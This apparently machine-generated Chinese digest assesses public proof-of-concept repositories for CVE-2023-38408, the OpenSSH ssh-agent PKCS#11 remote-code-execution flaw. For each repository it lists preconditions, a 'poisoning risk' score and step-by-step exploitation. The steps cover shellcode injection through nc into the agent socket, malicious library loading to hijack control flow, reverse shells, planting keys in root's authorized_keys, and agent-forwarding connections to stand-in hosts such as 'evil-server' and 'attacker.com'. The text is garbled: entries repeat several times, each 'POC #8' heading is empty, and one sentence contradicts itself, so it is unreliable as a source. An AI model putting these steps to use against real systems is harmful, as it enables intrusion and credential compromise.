PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

